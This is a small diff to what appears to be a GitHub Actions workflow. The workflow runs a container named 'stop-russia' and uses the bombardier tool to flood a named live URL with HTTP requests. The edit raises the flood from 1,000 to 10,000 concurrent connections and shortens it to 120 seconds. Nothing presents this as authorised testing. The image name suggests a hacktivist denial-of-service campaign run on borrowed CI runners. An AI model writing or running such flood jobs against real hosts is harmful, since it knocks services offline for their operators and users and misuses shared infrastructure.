@@ -21,6 +21,6 @@ jobs:
         with:
             image: abagayev/stop-russia:latest
             run: | 
-                  bombardier -c 1000 -d 3600s -l https://testngwaf.global.ssl.fastly.net
+                  bombardier -c 10000 -d 120s -l https://testngwaf.global.ssl.fastly.net
   
 
